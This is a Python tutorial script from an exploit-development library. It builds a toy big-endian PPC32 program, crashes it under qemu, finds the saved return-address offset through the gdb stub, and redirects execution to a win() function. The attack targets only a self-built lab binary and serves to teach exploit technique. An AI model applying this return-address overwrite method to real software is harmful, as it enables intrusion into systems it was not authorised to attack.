# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
"""cento -- borrowed fragments, arranged deliberately, checked as a whole.

Example 4 -- big-endian for real: ret2win on PPC32 under qemu

ex03 landed on your own CPU; this lands on the MK-1's -- real PPC32, emulated by qemu-ppc
(apt install qemu-user; the example explains itself and exits cleanly without it). No cross
compiler either: the victim is thirty-one hand-assembled instructions, built into an ELF from
the encodings in victim.py, next to this script.

Two PPC facts do the teaching. First: there is no canonicality check -- `blr` happily jumps to
pad bytes, so the crashed nip IS the needle, read from qemu's gdb stub (the standard qemu-user
debugging channel; the client below speaks the ten lines of remote protocol it needs). Second:
branch targets are word-aligned, so `mtlr/blr` masked the needle's low two bits -- recover them
by trying the four candidates. And the needle is BIG-endian on the wire, exactly like the pad.

Run: python3 examples/ex04/ex04_qemu_ret2win.py
Next: ex05_computed_cells
"""

from __future__ import annotations

import pathlib
import shutil
import socket
import subprocess
import sys
import tempfile
import time

# The victim (thirty-one hand-assembled PPC32 instructions + an ELF32-BE writer) lives in
# victim.py, next to this script. Dual-mode import: as examples.ex04.ex04_qemu_ret2win under
# pytest, or standalone (python3 examples/ex04/ex04_qemu_ret2win.py, where ex04/ is sys.path[0]).
try:
    from examples.ex04.victim import assemble_victim
except ModuleNotFoundError:  # standalone run
    from victim import assemble_victim  # type: ignore[import-not-found, no-redef]

import cento


# -- ten lines of gdb remote protocol: qemu-user's crash-report channel -------------------------
def gdb_packet(sock: socket.socket, command: str) -> bytes:
    sock.sendall(f"${command}#{sum(command.encode()) & 0xFF:02x}".encode())
    buf = b""
    while b"#" not in buf or len(buf) - buf.rindex(b"#") < 3:
        chunk = sock.recv(4096)
        if not chunk:  # qemu died / clean FIN: recv() returns b"" forever -- refuse, never spin
            raise ConnectionError(f"gdb stub closed the connection mid-reply to {command!r} (got {len(buf)} bytes)")
        buf += chunk
    sock.sendall(b"+")  # ack
    return buf[buf.index(b"$") + 1 : buf.rindex(b"#")]


def crashed_nip(qemu: str, victim: str, payload: bytes) -> int:
    """Run the victim under qemu -g, continue to the crash, read nip from the g packet."""
    probe = socket.socket()
    probe.bind(("127.0.0.1", 0))
    port = probe.getsockname()[1]
    probe.close()
    proc = subprocess.Popen([qemu, "-g", str(port), victim], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    assert proc.stdin is not None
    try:
        proc.stdin.write(payload)
        proc.stdin.close()
    except BrokenPipeError:
        proc.kill()
        raise ConnectionError("qemu exited before reading the payload -- rerun; if it persists, run the victim under qemu by hand") from None
    try:
        sock = None
        deadline = time.monotonic() + 5.0
        while sock is None:  # retry-connect: on a loaded box qemu can take >0.3s to bind the stub
            try:
                sock = socket.create_connection(("127.0.0.1", port), timeout=10)
            except ConnectionRefusedError:
                if time.monotonic() > deadline or proc.poll() is not None:
                    raise ConnectionError("qemu's gdb stub never came up (slow start, a stolen port, or an early qemu exit)") from None
                time.sleep(0.05)
        stop = gdb_packet(sock, "c")  # continue; the reply is the stop packet (T0b = SIGSEGV)
        regs = gdb_packet(sock, "g")  # 32 GPRs (u32) + 32 FPRs (u64), then nip
        gdb_packet(sock, "k")
        sock.close()
        if len(regs) < 776:  # 32*8 GPR chars + 32*16 FPR chars, then nip -- qemu reshuffles g-packet layouts across releases
            raise ConnectionError(f"qemu g-packet layout drift: {len(regs)} hex chars, expected >= 776 (32 GPRs + 32 FPRs + nip)")
        print(f"qemu gdb stub: stop={stop[:3].decode()} (0b = SIGSEGV)")
        return int(regs[768:776], 16)
    finally:
        proc.kill()


def main() -> bool:
    qemu = shutil.which("qemu-ppc") or shutil.which("qemu-ppc-static")
    if qemu is None:
        print("no qemu-ppc found -- apt install qemu-user (or qemu-user-static); this example runs real PPC32 under it")
        return True

    with tempfile.TemporaryDirectory(prefix="cento-qemu-") as tmp:
        victim = pathlib.Path(tmp) / "vuln"
        elf, win = assemble_victim()
        victim.write_bytes(elf)
        victim.chmod(0o755)
        print(f"assembled {victim.name}: ELF32 big-endian PPC, 31 instructions; win() at {win:#x}")
        normal = subprocess.run([qemu, str(victim)], input=b"hello\n", capture_output=True, timeout=10)
        print(f"sanity run: {normal.stdout.decode().strip()!r}")

        print("\nstep 1: throw the pad; read the crashed nip from the gdb stub")
        probe = cento.region("frame", max_size=0x60, pad=4, endian="big")  # big-endian, like the target
        nip = crashed_nip(qemu, str(victim), probe.image())
        print(f"crashed nip = {nip:#010x} -- pad bytes, big-endian, with the low two bits MASKED (branches are word-aligned)")

        print("\nstep 2: recover the masked bits, then cycle_find the big-endian needle")
        offset = fix = -1
        for fix in range(4):
            try:
                offset = cento.cycle_find(nip | fix, endian="big")  # the nip loaded the pad big-endian; the default is little
                break
            except ValueError:
                continue
        print(f"cycle_find({nip:#x} | 0b{(nip | fix) & 3:02b}) -> offset {offset} (0x{offset:x}) = the saved-LR slot")

        print(f"\nstep 3: rebuild with win ({win:#x}) in the saved-LR slot, throw it for real")
        aimed = cento.region("frame", max_size=0x60, pad=4, endian="big")
        aimed[offset] = win  # the patch rides on top of the pad; 4 bytes IS the full address on PPC32
        landed = subprocess.run([qemu, str(victim)], input=aimed.image(), capture_output=True, timeout=10)
        print(f"throw it: {landed.stdout.decode().strip()}")
    return True


if __name__ == "__main__":
    if not main():
        sys.exit(1)
